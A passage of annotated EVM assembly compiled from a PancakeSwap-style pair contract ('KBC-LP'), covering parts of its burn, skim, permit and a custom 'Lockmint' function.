tag_249:\n        /* \"src/Pair.sol\":8841:8881  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_250\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_250:\n      pop\n        /* \"src/Pair.sol\":8841:8881  IERC20(_token1).balanceOf(address(this)) */\n      mload\n      swap4\n      pop\n        /* \"src/Pair.sol\":8892:8941  _update(balance0, balance1, _reserve0, _reserve1) */\n      tag_251\n        /* \"src/Pair.sol\":8900:8908  balance0 */\n      dup6\n        /* \"src/Pair.sol\":8841:8881  IERC20(_token1).balanceOf(address(this)) */\n      dup6\n        /* \"src/Pair.sol\":8920:8929  _reserve0 */\n      dup12\n        /* \"src/Pair.sol\":8931:8940  _reserve1 */\n      dup12\n        /* \"src/Pair.sol\":8892:8899  _update */\n      tag_179\n        /* \"src/Pair.sol\":8892:8941  _update(balance0, balance1, _reserve0, _reserve1) */\n      jump\t// in\n    tag_251:\n        /* \"src/Pair.sol\":8955:8960  feeOn */\n      dup2\n        /* \"src/Pair.sol\":8951:8998  if (feeOn) kLast = uint(reserve0).mul(reserve1) */\n      iszero\n      tag_252\n      jumpi\n        /* \"src/Pair.sol\":8989:8997  reserve1 */\n      sload(0x0b)\n        /* \"src/Pair.sol\":8970:8998  uint(reserve0).mul(reserve1) */\n      tag_253\n      swap1\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":8975:8983  reserve0 */\n      dup1\n      dup3\n      and\n      swap2\n      shl(0x70, 0x01)\n        /* \"src/Pair.sol\":8989:8997  reserve1 */\n      swap1\n      div\n      and\n        /* \"src/Pair.sol\":8970:8998  uint(reserve0).mul(reserve1) */\n      0xffffffff\n        /* \"src/Pair.sol\":8970:8988  uint(reserve0).mul */\n      tag_168\n        /* \"src/Pair.sol\":8970:8998  uint(reserve0).mul(reserve1) */\n      and\n      jump\t// in\n    tag_253:\n        /* \"src/Pair.sol\":8962:8967  kLast */\n      0x0e\n        /* \"src/Pair.sol\":8962:8998  kLast = uint(reserve0).mul(reserve1) */\n      sstore\n        /* \"src/Pair.sol\":8951:8998  if (feeOn) kLast = uint(reserve0).mul(reserve1) */\n    tag_252:\n        /* \"src/Pair.sol\":9053:9091  Burn(msg.sender, amount0, amount1, to) */\n      0x40\n      dup1\n      mload\n      dup13\n      dup2\n      mstore\n      0x20\n      dup2\n      add\n      dup13\n      swap1\n      mstore\n      dup2\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      dup16\n      and\n      swap3\n        /* \"src/Pair.sol\":9058:9068  msg.sender */\n      caller\n      swap3\n        /* \"src/Pair.sol\":9053:9091  Burn(msg.sender, amount0, amount1, to) */\n      0xdccd412f0b1252819cb1fd330b93224ca42612892bb3f4f789976e6d81936496\n      swap3\n      swap1\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n        /* \"src/Pair.sol\":1244:1245  _ */\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"src/Pair.sol\":1266:1267  1 */\n      0x01\n        /* \"src/Pair.sol\":1255:1263  unlocked */\n      0x0f\n        /* \"src/Pair.sol\":1255:1267  unlocked = 1 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"src/Pair.sol\":7669:9098  function burn(... */\n      swap2\n      pop\n      swap2\n      jump\t// out\n        /* \"src/Pair.sol\":325:395  address public FeeResiver = 0x9E94Ee69F3CdCd5E74e05563736E4679dA6dB44c */\n    tag_96:\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x06))\n      dup2\n      jump\t// out\n        /* \"src/ERC20.sol\":220:260  string public constant symbol = \"KBC-LP\" */\n    tag_98:\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x06\n      dup2\n      mstore\n      0x20\n      add\n      shl(0xd4, 0x04b42432d4c5)\n      dup2\n      mstore\n      pop\n      dup2\n      jump\t// out\n        /* \"src/ERC20.sol\":2963:3102  function transfer(address to, uint256 value) external returns (bool) {... */\n    tag_105:\n        /* \"src/ERC20.sol\":3026:3030  bool */\n      0x00\n        /* \"src/ERC20.sol\":3042:3074  _transfer(msg.sender, to, value) */\n      tag_182\n        /* \"src/ERC20.sol\":3052:3062  msg.sender */\n      caller\n        /* \"src/ERC20.sol\":3064:3066  to */\n      dup5\n        /* \"src/ERC20.sol\":3068:3073  value */\n      dup5\n        /* \"src/ERC20.sol\":3042:3051  _transfer */\n      tag_190\n        /* \"src/ERC20.sol\":3042:3074  _transfer(msg.sender, to, value) */\n      jump\t// in\n        /* \"src/Pair.sol\":402:450  uint public constant MINIMUM_LIQUIDITY = 10 ** 3 */\n    tag_107:\n        /* \"src/Pair.sol\":443:450  10 ** 3 */\n      0x03e8\n        /* \"src/Pair.sol\":402:450  uint public constant MINIMUM_LIQUIDITY = 10 ** 3 */\n      dup2\n      jump\t// out\n        /* \"src/Pair.sol\":17701:18122  function skim(address to) external lock {... */\n    tag_110:\n        /* \"src/Pair.sol\":1179:1187  unlocked */\n      sload(0x0f)\n        /* \"src/Pair.sol\":1191:1192  1 */\n      0x01\n        /* \"src/Pair.sol\":1179:1192  unlocked == 1 */\n      eq\n        /* \"src/Pair.sol\":1171:1212  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_257\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_257:\n        /* \"src/Pair.sol\":1233:1234  0 */\n      0x00\n        /* \"src/Pair.sol\":1222:1230  unlocked */\n      0x0f\n        /* \"src/Pair.sol\":1222:1234  unlocked = 0 */\n      sstore\n        /* \"src/Pair.sol\":17769:17775  token0 */\n      sload(0x08)\n        /* \"src/Pair.sol\":17818:17824  token1 */\n      sload(0x09)\n        /* \"src/Pair.sol\":17958:17966  reserve0 */\n      sload(0x0b)\n        /* \"src/Pair.sol\":17913:17953  IERC20(_token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/Pair.sol\":17947:17951  this */\n      address\n        /* \"src/Pair.sol\":17913:17953  IERC20(_token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":17769:17775  token0 */\n      swap5\n      dup6\n      and\n      swap5\n        /* \"src/Pair.sol\":17818:17824  token1 */\n      swap1\n      swap4\n      and\n      swap3\n        /* \"src/Pair.sol\":17849:17977  _safeTransfer(... */\n      tag_259\n      swap3\n        /* \"src/Pair.sol\":17769:17775  token0 */\n      dup6\n      swap3\n        /* \"src/Pair.sol\":17897:17899  to */\n      dup8\n      swap3\n        /* \"src/Pair.sol\":17913:17967  IERC20(_token0).balanceOf(address(this)).sub(reserve0) */\n      tag_260\n      swap3\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":17958:17966  reserve0 */\n      and\n      swap2\n        /* \"src/Pair.sol\":17769:17775  token0 */\n      dup6\n      swap2\n        /* \"src/Pair.sol\":17913:17938  IERC20(_token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/Pair.sol\":17913:17953  IERC20(_token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n      0x20\n      swap3\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/Pair.sol\":17769:17775  token0 */\n      dup7\n        /* \"src/Pair.sol\":17913:17953  IERC20(_token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_261\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_261:\n        /* \"src/Pair.sol\":17913:17953  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_262\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_262:\n        /* \"src/Pair.sol\":17913:17953  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_263\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_263:\n      pop\n        /* \"src/Pair.sol\":17913:17953  IERC20(_token0).balanceOf(address(this)) */\n      mload\n      swap1\n        /* \"src/Pair.sol\":17913:17967  IERC20(_token0).balanceOf(address(this)).sub(reserve0) */\n      0xffffffff\n        /* \"src/Pair.sol\":17913:17957  IERC20(_token0).balanceOf(address(this)).sub */\n      tag_170\n        /* \"src/Pair.sol\":17913:17967  IERC20(_token0).balanceOf(address(this)).sub(reserve0) */\n      and\n      jump\t// in\n    tag_260:\n        /* \"src/Pair.sol\":17849:17862  _safeTransfer */\n      tag_142\n        /* \"src/Pair.sol\":17849:17977  _safeTransfer(... */\n      jump\t// in\n    tag_259:\n        /* \"src/Pair.sol\":18096:18104  reserve1 */\n      sload(0x0b)\n        /* \"src/Pair.sol\":18051:18091  IERC20(_token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/Pair.sol\":18085:18089  this */\n      address\n        /* \"src/Pair.sol\":18051:18091  IERC20(_token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/Pair.sol\":17987:18115  _safeTransfer(... */\n      tag_264\n      swap3\n        /* \"src/Pair.sol\":18014:18021  _token1 */\n      dup5\n      swap3\n        /* \"src/Pair.sol\":18035:18037  to */\n      dup8\n      swap3\n        /* \"src/Pair.sol\":18051:18105  IERC20(_token1).balanceOf(address(this)).sub(reserve1) */\n      tag_260\n      swap3\n      shl(0x70, 0x01)\n        /* \"src/Pair.sol\":18096:18104  reserve1 */\n      swap1\n      div\n      sub(shl(0x70, 0x01), 0x01)\n      and\n      swap2\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":18051:18076  IERC20(_token1).balanceOf */\n      dup7\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"src/Pair.sol\":18051:18091  IERC20(_token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n      0x20\n      swap3\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/Pair.sol\":18051:18076  IERC20(_token1).balanceOf */\n      dup7\n        /* \"src/Pair.sol\":18051:18091  IERC20(_token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_261\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"src/Pair.sol\":17987:18115  _safeTransfer(... */\n    tag_264:\n      pop\n      pop\n        /* \"src/Pair.sol\":1266:1267  1 */\n      0x01\n        /* \"src/Pair.sol\":1255:1263  unlocked */\n      0x0f\n        /* \"src/Pair.sol\":1255:1267  unlocked = 1 */\n      sstore\n      pop\n        /* \"src/Pair.sol\":17701:18122  function skim(address to) external lock {... */\n      jump\t// out\n        /* \"src/Pair.sol\":559:581  address public factory */\n    tag_112:\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x07))\n      dup2\n      jump\t// out\n        /* \"src/Pair.sol\":614:635  address public token1 */\n    tag_114:\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x09))\n      dup2\n      jump\t// out\n        /* \"src/ERC20.sol\":3475:4439  function permit(... */\n    tag_117:\n        /* \"src/ERC20.sol\":3688:3703  block.timestamp */\n      timestamp\n        /* \"src/ERC20.sol\":3676:3684  deadline */\n      dup5\n        /* \"src/ERC20.sol\":3676:3703  deadline >= block.timestamp */\n      lt\n      iszero\n        /* \"src/ERC20.sol\":3668:3724  require(deadline >= block.timestamp, \"Pancake: EXPIRED\") */\n      tag_270\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x10\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x82, 0x14185b98d85ad94e8811561412549151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_270:\n        /* \"src/ERC20.sol\":3836:3852  DOMAIN_SEPARATOR */\n      sload(0x04)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":4073:4086  nonces[owner] */\n      dup1\n      dup10\n      and\n        /* \"src/ERC20.sol\":3734:3748  bytes32 digest */\n      0x00\n        /* \"src/ERC20.sol\":4073:4086  nonces[owner] */\n      dup2\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":4073:4079  nonces */\n      0x05\n        /* \"src/ERC20.sol\":4073:4086  nonces[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/ERC20.sol\":4073:4088  nonces[owner]++ */\n      dup1\n      sload\n      0x01\n      dup1\n      dup3\n      add\n      swap1\n      swap3\n      sstore\n        /* \"src/ERC20.sol\":3901:4144  abi.encode(... */\n      dup3\n      mload\n        /* \"src/ERC20.sol\":706:772  0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9 */\n      0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9\n        /* \"src/ERC20.sol\":3901:4144  abi.encode(... */\n      dup2\n      dup7\n      add\n      mstore\n      dup1\n      dup5\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      swap6\n      dup14\n      and\n      0x60\n      dup7\n      add\n      mstore\n      0x80\n      dup6\n      add\n      dup13\n      swap1\n      mstore\n      0xa0\n      dup6\n      add\n      swap6\n      swap1\n      swap6\n      mstore\n      0xc0\n      dup1\n      dup6\n      add\n      dup12\n      swap1\n      mstore\n      dup2\n      mload\n        /* \"--CODEGEN--\":26:47   */\n      dup1\n      dup7\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      swap1\n      swap2\n      add\n        /* \"--CODEGEN--\":6:55   */\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":3901:4144  abi.encode(... */\n      0xe0\n      dup6\n      add\n      dup3\n      mstore\n        /* \"src/ERC20.sol\":3870:4162  keccak256(... */\n      dup1\n      mload\n      swap1\n      dup4\n      add\n      keccak256\n      shl(0xf0, 0x1901)\n        /* \"src/ERC20.sol\":3774:4176  abi.encodePacked(... */\n      0x0100\n      dup7\n      add\n      mstore\n      0x0102\n      dup6\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      0x0122\n      dup1\n      dup6\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      dup1\n      mload\n        /* \"--CODEGEN--\":26:47   */\n      dup1\n      dup6\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      swap1\n      swap7\n      add\n        /* \"--CODEGEN--\":6:55   */\n      dup7\n      mstore\n        /* \"src/ERC20.sol\":3774:4176  abi.encodePacked(... */\n      0x0142\n      dup5\n      add\n      dup1\n      dup3\n      mstore\n        /* \"src/ERC20.sol\":3751:4186  keccak256(... */\n      dup7\n      mload\n      swap7\n      dup4\n      add\n      swap7\n      swap1\n      swap7\n      keccak256\n        /* \"src/ERC20.sol\":4223:4249  ecrecover(digest, v, r, s) */\n      swap6\n      dup4\n      swap1\n      mstore\n      0x0162\n      dup5\n      add\n      dup1\n      dup3\n      mstore\n      dup7\n      swap1\n      mstore\n      0xff\n      dup10\n      and\n      0x0182\n      dup6\n      add\n      mstore\n      0x01a2\n      dup5\n      add\n      dup9\n      swap1\n      mstore\n      0x01c2\n      dup5\n      add\n      dup8\n      swap1\n      mstore\n      mload\n        /* \"src/ERC20.sol\":3734:3748  bytes32 digest */\n      swap2\n      swap4\n        /* \"src/ERC20.sol\":4073:4088  nonces[owner]++ */\n      swap3\n        /* \"src/ERC20.sol\":4223:4249  ecrecover(digest, v, r, s) */\n      0x01e2\n      dup1\n      dup3\n      add\n      swap4\n      not(0x1f)\n      dup2\n      add\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n        /* \"src/ERC20.sol\":4073:4088  nonces[owner]++ */\n      dup6\n        /* \"src/ERC20.sol\":4223:4249  ecrecover(digest, v, r, s) */\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_271\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_271:\n      pop\n      pop\n        /* \"src/ERC20.sol\":4223:4249  ecrecover(digest, v, r, s) */\n      mload(add(not(0x1f), mload(0x40)))\n      swap2\n      pop\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":4280:4310  recoveredAddress != address(0) */\n      dup2\n      and\n      iszero\n      dup1\n      iszero\n      swap1\n        /* \"src/ERC20.sol\":4280:4339  recoveredAddress != address(0) && recoveredAddress == owner */\n      tag_272\n      jumpi\n      pop\n        /* \"src/ERC20.sol\":4334:4339  owner */\n      dup9\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":4314:4339  recoveredAddress == owner */\n      and\n        /* \"src/ERC20.sol\":4314:4330  recoveredAddress */\n      dup2\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":4314:4339  recoveredAddress == owner */\n      and\n      eq\n        /* \"src/ERC20.sol\":4280:4339  recoveredAddress != address(0) && recoveredAddress == owner */\n    tag_272:\n        /* \"src/ERC20.sol\":4259:4391  require(... */\n      tag_273\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x1a\n      0x24\n      dup3\n      add\n      mstore\n      0x50616e63616b653a20494e56414c49445f5349474e4154555245000000000000\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_273:\n        /* \"src/ERC20.sol\":4401:4432  _approve(owner, spender, value) */\n      tag_274\n        /* \"src/ERC20.sol\":4410:4415  owner */\n      dup10\n        /* \"src/ERC20.sol\":4417:4424  spender */\n      dup10\n        /* \"src/ERC20.sol\":4426:4431  value */\n      dup10\n        /* \"src/ERC20.sol\":4401:4409  _approve */\n      tag_183\n        /* \"src/ERC20.sol\":4401:4432  _approve(owner, spender, value) */\n      jump\t// in\n    tag_274:\n        /* \"src/ERC20.sol\":3475:4439  function permit(... */\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/Pair.sol\":6279:7560  function Lockmint(address to) external lock returns (uint liquidity) {... */\n    tag_120:\n        /* \"src/Pair.sol\":6332:6346  uint liquidity */\n      0x00\n        /* \"src/Pair.sol\":1179:1187  unlocked */\n      sload(0x0f)\n        /* \"src/Pair.sol\":1191:1192  1 */\n      0x01\n        /* \"src/Pair.sol\":1179:1192  unlocked == 1 */\n      eq\n        /* \"src/Pair.sol\":1171:1212  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_276\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_276:\n        /* \"src/Pair.sol\":1233:1234  0 */\n      0x00\n        /* \"src/Pair.sol\":1222:1230  unlocked */\n      0x0f\n        /* \"src/Pair.sol\":1222:1234  unlocked = 0 */\n      dup2\n      swap1\n      sstore\n        /* \"src/Pair.sol\":1233:1234  0 */\n      dup1\n        /* \"src/Pair.sol\":6401:6414  getReserves() */\n      tag_278\n        /* \"src/Pair.sol\":6401:6412  getReserves */\n      tag_54\n        /* \"src/Pair.sol\":6401:6414  getReserves() */\n      jump\t// in\n    tag_278:\n      pop\n        /* \"src/Pair.sol\":6462:6468  token0 */\n      sload(0x08)\n        /* \"src/Pair.sol\":6455:6494  IERC20(token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/Pair.sol\":6488:6492  this */\n      address\n        /* \"src/Pair.sol\":6455:6494  IERC20(token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/Pair.sol\":6358:6414  (uint112 _reserve0, uint112 _reserve1, ) = getReserves() */\n      swap4\n      swap6\n      pop\n      swap2\n      swap4\n      pop\n        /* \"src/Pair.sol\":6439:6452  uint balance0 */\n      0x00\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":6462:6468  token0 */\n      swap1\n      swap2\n      and\n      swap2\n        /* \"src/Pair.sol\":6455:6479  IERC20(token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/Pair.sol\":6455:6494  IERC20(token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/Pair.sol\":6462:6468  token0 */\n      dup7\n        /* \"src/Pair.sol\":6455:6494  IERC20(token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_279\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_279:\n        /* \"src/Pair.sol\":6455:6494  IERC20(token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_280\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_280:\n        /* \"src/Pair.sol\":6455:6494  IERC20(token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_281\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_281:\n      pop\n        /* \"src/Pair.sol\":6455:6494  IERC20(token0).balanceOf(address(this)) */\n      mload\n        /* \"src/Pair.sol\":6527:6533  token1 */\n      sload(0x09)\n        /* \"src/Pair.sol\":6520:6559  IERC20(token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/Pair.sol\":6553:6557  this */\n      address\n        /* \"src/Pair.sol\":6520:6559  IERC20(token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/Pair.sol\":6455:6494  IERC20(token0).balanceOf(address(this)) */\n      swap3\n      swap4\n      pop\n        /* \"src/Pair.sol\":6504:6517  uint balance1 */\n      0x00\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":6527:6533  token1 */\n      swap1\n      swap3\n      and\n      swap2\n        /* \"src/Pair.sol\":6520:6544  IERC20(token1).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/Pair.sol\":6520:6559  IERC20(token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"src/Pair.sol\":6455:6494  IERC20(token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"src/Pair.sol\":6520:6559  IERC20(token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/Pair.sol\":6527:6533  token1 */\n      dup7\n        /* \"src/Pair.sol\":6520:6559  IERC20(token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_282\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_282:\n        /* \"src/Pair.sol\":6520:6559  IERC20(token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_283\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_283:\n        /* \"src/Pair.sol\":6520:6559  IERC20(token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_284\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_284:\n      pop\n        /* \"src/Pair.sol\":6520:6559  IERC20(token1).balanceOf(address(this)) */\n      mload\n      swap1\n      pop\n        /* \"src/Pair.sol\":6569:6581  uint amount0 */\n      0x00\n        /* \"src/Pair.sol\":6584:6607  balance0.sub(_reserve0) */\n      tag_285\n        /* \"src/Pair.sol\":6584:6592  balance0 */\n      dup4\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":6584:6607  balance0.sub(_reserve0) */\n      dup8\n      and\n      0xffffffff\n        /* \"src/Pair.sol\":6584:6596  balance0.sub */\n      tag_170\n        /* \"src/Pair.sol\":6584:6607  balance0.sub(_reserve0) */\n      and\n      jump\t// in\n    tag_285:\n        /* 